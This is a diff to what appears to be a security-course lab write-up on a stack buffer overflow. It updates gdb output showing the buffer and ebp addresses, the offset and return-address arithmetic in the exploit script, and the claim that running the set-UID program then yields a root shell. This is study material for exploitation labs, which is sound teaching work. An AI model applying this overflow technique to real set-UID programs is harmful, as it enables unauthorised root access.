@@ -107,16 +107,15 @@ gdb-peda$ run
 Breakpoint 1, bof (str=0xbfffeb57 "\bB\003") at stack.c:18
 18	    strcpy(buffer, str); 
 ...
-gdb-peda$ p/x &buffer
-$1 = 0xbfffeacc
-gdb-peda$ p/x $ebp
-$2 = 0xbfffeb38
+gdb-peda$ p &buffer
+$1 = (char (*)[100]) 0xffffce9c
+gdb-peda$ p $ebp
+$2 = (void *) 0xffffcf08
 ```
 
 Now we know that:
-- buffer = 0xbfffeacc
-- ebp = 0xbfffeb38
-- L = 4
+- buffer = 0xffffce9c
+- ebp = 0xffffcf08
 - offset = ebp - buffer + L
 - ret = buffer + offset + 100
 
@@ -143,12 +142,14 @@ shellcode= (
 L = 4
 
 # Calculate the offset to place the return address right after the buffer (ebp - buffer + L)
-offset = 0xbfffeb38 - 0xbfffeacc + L # The size of the buffer in the vulnerable program
+offset = 0xffffcf08 - 0xffffce9c + L # The size of the buffer in the vulnerable program
 # Return address (buffer + offset + buffersize).
-ret = 0xbfffeacc + offset + 100 
+ret = 0xffffce9c + offset + 100 
 ```
 
 Finally running `/Lab7/exercise3/stack-L1` (the set-UID program) will give us the root shell  due to copying excess data from the `badfile` which causes buffer overflow. By doing so, we can redirect the program's execution flow to a location controlled by `badfile`, 
 
 
 ![attacks](/Lab7/exercise3/img/2.png)
+
+## Exercise 4: Launching Attack on 32-bit Program (Level 2)
